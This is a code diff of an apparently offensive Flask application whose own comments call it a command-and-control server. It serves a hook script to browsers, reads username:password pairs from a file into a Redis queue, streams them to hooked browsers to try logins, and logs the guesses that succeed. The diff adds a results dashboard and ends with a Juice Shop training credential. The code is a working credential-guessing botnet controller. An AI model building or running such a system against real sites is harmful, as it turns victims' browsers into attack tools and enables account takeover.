@@ -1,10 +1,11 @@
-from flask import Flask, request, jsonify, render_template, Response, after_this_request
+from flask import Flask, request, jsonify, render_template, Response, after_this_request, send_file, abort
 from flask_cors import cross_origin
-from cef import app, db, attack_queue, result_queue
+from cef import app, db, rs
 from cef.models import Node, Attack, Result
 from cef.utils import fingerprint
 from time import sleep
 import json
+import pickle
 
 def build_attack(attack_id, u, p):
     attack = Attack.query.get(attack_id)
@@ -24,14 +25,18 @@ def rebuild_attack(attack_id, payload):
 
 def attack_stream():
     while True:
-        sleep(3)
-        attack = attack_queue.get()
-        yield 'data: %s\n\n' % json.dumps(attack)
+        sleep(1)
+        attack = rs.brpop('attacks')
+        payload = 'retry: {}\n'.format(3000)
+        payload += 'data: {}\n\n'.format(attack[1])
+        yield payload
 
-def result_stream():
+def results_stream():
     while True:
-        result = result_queue.get()
-        yield 'data: %s\n\n' % json.dumps(result)
+        result = rs.brpop('results')
+        payload = 'retry: {}\n'.format(3000)
+        payload +='data: {}\n\n'.format(result[1])
+        yield payload
 
 # streaming controllers
 
@@ -50,9 +55,9 @@ def stream_attack():
         db.session.commit()
     return Response(attack_stream(), mimetype='text/event-stream')
 
-@app.route('/stream/result')
-def stream_result():
-    return Response(result_stream(), mimetype='text/event-stream')
+@app.route('/stream/results')
+def stream_results():
+    return Response(results_stream(), mimetype='text/event-stream')
 
 # attack controllers
 
@@ -65,9 +70,9 @@ def js_file(filename):
         return response
     return render_template('hook.js')
 
-@app.route('/result', methods=['POST'])
+@app.route('/report/result', methods=['POST'])
 @cross_origin()
-def result():
+def report_result():
     jsonobj = json.loads(request.data)
     attack = Attack.query.get(jsonobj.get('id') or -1)
     resp = jsonobj.get('result')
@@ -86,6 +91,8 @@ def result():
             )
             db.session.add(result)
             db.session.commit()
+            # update dashboard
+            rs.lpush('results', json.dumps(result.serialize()))
         # process an unsuccessful guess
         elif attack.fail in resp:
             # ignore the result
@@ -93,7 +100,8 @@ def result():
         # process an unexpected result
         else:
             # re-queue the payload
-            attack_queue.put(rebuild_attack(attack.id, payload))
+            a = rebuild_attack(attack.id, payload)
+            rs.lpush('attacks', json.dumps(a))
     # process a bad request
     else:
         # can't re-queue the payload without a valid attack id
@@ -102,6 +110,10 @@ def result():
 
 # c2 controllers
 
+@app.route('/dashboard')
+def dashboard():
+    return send_file('dashboard.html')
+
 @app.route('/queue')
 def queue():
     attack_id = 1
@@ -109,8 +121,13 @@ def queue():
         for line in fp:
             u, p = line.strip().split(':')
             a = build_attack(attack_id, u, p)
-            attack_queue.put(a)
+            rs.lpush('attacks', json.dumps(a))
     return 'done'
+
+@app.route('/results')
+def results():
+    results = [r.serialize() for r in Result.query.all()]
+    return jsonify(results=results)
 
 '''
 admin@juice-sh.op:admin123
